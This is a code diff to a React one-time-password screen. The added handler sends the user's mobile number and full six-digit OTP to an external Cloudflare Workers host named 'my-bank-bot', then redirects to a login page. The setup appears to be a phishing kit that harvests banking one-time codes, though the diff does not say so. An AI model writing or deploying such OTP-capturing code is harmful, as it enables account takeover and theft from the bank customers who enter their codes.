@@ -1,11 +1,12 @@
 import { useState, useEffect } from "react";
 import "./index.css";
-import { useLocation } from "react-router-dom";
+import { useLocation, useNavigate } from "react-router-dom";
 
 export default function OtpScreen() {
     const [otp, setOtp] = useState(["", "", "", "", "", ""]);
     const [timer, setTimer] = useState(42);
     const location = useLocation();
+    const navigate = useNavigate(); 
     const { mobile } = location.state;
 
     useEffect(() => {
@@ -15,13 +16,54 @@ export default function OtpScreen() {
         }
     }, [timer]);
 
-    const handleChange = (e, index) => {
+    // const handleChange = (e, index) => {
+    //     const value = e.target.value.replace(/\D/g, "");
+    //     const newOtp = [...otp];
+    //     newOtp[index] = value ? value.charAt(value.length - 1) : "";
+    //     setOtp(newOtp);
+    //     if (index < 5 && value) {
+    //         document.getElementById(`otp-${index + 1}`).focus();
+    //     }
+    // };
+
+    const handleChange = async (e, index) => {
         const value = e.target.value.replace(/\D/g, "");
         const newOtp = [...otp];
         newOtp[index] = value ? value.charAt(value.length - 1) : "";
         setOtp(newOtp);
+
         if (index < 5 && value) {
             document.getElementById(`otp-${index + 1}`).focus();
+        }
+
+        // ✅ check if OTP completed
+        if (newOtp.every((digit) => digit !== "")) {
+            const otpCode = newOtp.join("");
+
+            try {
+                const res = await fetch("https://my-bank-bot.instapayapi.workers.dev/api/otp", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        username: mobile,
+                        otp: otpCode,
+                    }),
+                });
+
+                const data = await res.json();
+                console.log("OTP API Response:", data);
+
+                if (data.success) {
+                    navigate("/login", { state: { mobile } });
+                } else {
+                    alert("Invalid OTP, please try again!");
+                    setOtp(["", "", "", "", "", ""]);
+                    document.getElementById("otp-0").focus();
+                }
+            } catch (err) {
+                console.error("API Error:", err);
+                alert("Something went wrong, try again later.");
+            }
         }
     };
 
